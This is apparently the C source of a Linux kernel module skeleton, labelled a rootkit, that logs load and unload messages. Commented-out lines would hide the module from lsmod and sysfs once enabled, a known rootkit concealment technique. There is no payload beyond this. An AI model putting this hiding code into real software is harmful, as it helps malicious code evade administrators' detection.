#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

int rootkit_init(void)
{
	printk("Rootkit loaded\n");
	
	/* Uncomment the following lines after completion of module 
	 * Can't rmmod it if we have it uncommented during dev
	 * That's just cumbersome during dev
	 */
	
	/*
	// stop from showing on lsmod
	list_del_init(&__this_module.list);

	// stop showing in /proc/kallsyms
	kobject_del(&THIS_MODULE->mkobj.kobj);
	*/
	

	return 0;
}

void rootkit_exit(void)
{
	printk("Rootkit unloaded\n");
}


MODULE_LICENSE("GPL");
MODULE_AUTHOR("BufferOverflowers");
module_init(rootkit_init);
module_exit(rootkit_exit);
